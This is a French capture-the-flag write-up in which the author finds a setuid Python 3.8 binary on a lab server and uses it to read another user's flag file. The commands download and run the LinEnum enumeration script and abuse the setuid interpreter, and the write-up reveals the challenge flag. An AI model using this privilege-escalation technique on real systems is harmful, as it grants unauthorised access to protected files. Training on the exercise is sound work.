# To B, or ! to B - 128 pts

Énoncé :

> Votre client vous remercie pour votre  travail et vous assure qu'il a fait les modifications nécessaires pour  améliorer la sécurité de son serveur applicatif. 
>  Prouvez-lui que ce n'est toujours pas suffisant.
>
>
>  === Connexion SSH ===
>  Login : `padawan`
>  Mdp :  `padawan`
>  Serveur :` toBOrNot2B.phack.fr`
>
>  Artiste : `@Eagleslam`

On se connecte en SSH à la mahine :

```
 Bienvenue !

 Le flag se trouve dans /home/master/flag.txt
 Malheureusement, tu n'as pas les droits de le lire.

 Trouves un moyen d'y accéder par toi même.

 Bonne chance...
```

Un nouveau message nous attend dans notre home :

```
Cher Padawan,

C'est encore moi.
Tu as pu lire mes fichiers personnels. Tu deviens de plus en plus fort.

J'ai modifié la configuration du serveur pour éviter cela.

A plus tard,
Ton Master
```

On essaye de voir la configuration sudo :

```
$ sudo -l
-bash: sudo: command not found
```

Comme ça c'est réglé...

N'ayant pas d'idées (et n'ayant pas vu le "suid" dans les tags du challenge) je décide de faire mon bourrin. Je vais utiliser [LinEnum](https://github.com/rebootuser/LinEnum) :

```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Connecting to raw.githubusercontent.com (185.199.111.133:443)
saving to 'LinEnum.sh'
LinEnum.sh           100% |******************************************************************************************************************************************************| 46631  0:00:00 ETA
'LinEnum.sh' saved
$ chmod +x LinEnum.sh 
$ ./LinEnum.sh
```

Voici un extrait du rapport :

```
[-] SUID files:
-rwsr-xr-x    1 master   root         14048 Mar 15 12:52 /usr/bin/python3.8
```

Python a le bit Setuid ! Cela signifie que l'on peut l'exécuter en tant que `master` :

```
$ /usr/bin/python3.8 -c "print(open('/home/master/flag.txt').read())"
PHACK{U_4r3_hiM_bu7_h3's_n07_U}
```

